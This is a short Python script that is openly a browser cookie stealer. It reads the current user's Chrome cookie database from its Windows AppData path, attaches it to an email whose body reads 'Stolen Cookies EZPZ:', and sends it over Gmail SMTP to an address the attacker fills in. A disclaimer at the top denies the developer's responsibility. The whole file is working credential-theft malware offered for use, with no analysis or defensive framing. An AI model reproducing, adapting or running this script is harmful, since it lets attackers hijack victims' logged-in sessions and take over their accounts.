#The developer is not responsible for any use made with this script
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import getpass

username = getpass.getuser()

#INSERT DATA HERE
email_user = ""         #The e-mail adress to use to send the cookie file (less secure apps enabled)
email_password = ""     #The password of the e-mail above
email_send = ""         #The e-mail adress to recive the cookie file (can be the same as the first)

subject = 'subject'

msg = MIMEMultipart()
msg['From'] = email_user
msg['To'] = email_send
msg['Subject'] = subject

body = 'Stolen Cookies EZPZ:'
msg.attach(MIMEText(body,'plain'))

filename = str("C:\\Users\\" + username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies")
attachment = open(filename, 'rb')

part = MIMEBase('application','x-sqlite3')
part.set_payload(attachment.read())
encoders.encode_base64(part)
part.add_header('Content-Disposition',"attachment; filename= "+filename)

msg.attach(part)
text = msg.as_string()
server = smtplib.SMTP('smtp.gmail.com',587)
server.starttls()
server.login(email_user,email_password)


server.sendmail(email_user,email_send,text)
server.quit()